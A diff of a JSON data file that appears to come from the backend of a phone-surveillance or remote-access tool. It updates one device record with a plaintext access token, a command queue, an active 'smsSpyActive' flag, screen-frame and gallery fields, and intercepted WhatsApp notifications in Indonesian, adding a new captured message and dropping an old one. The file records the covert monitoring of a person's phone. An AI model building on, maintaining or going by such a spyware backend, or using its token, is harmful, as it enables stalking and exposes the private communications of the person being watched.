@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776958266162,
+    "lastSeen": 1776958278164,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 41 chat",
+        "time": "23/04 23:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776958267900
+      },
       {
         "appName": "WhatsApp",
         "sender": "Oi: Membalas Anda",
@@ -4011,14 +4019,6 @@
         "time": "23/04 21:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1776951128612
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎63 pesan dari 42 chat",
-        "time": "23/04 21:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776950991168
       }
     ],
     "galleryPhotos": [],
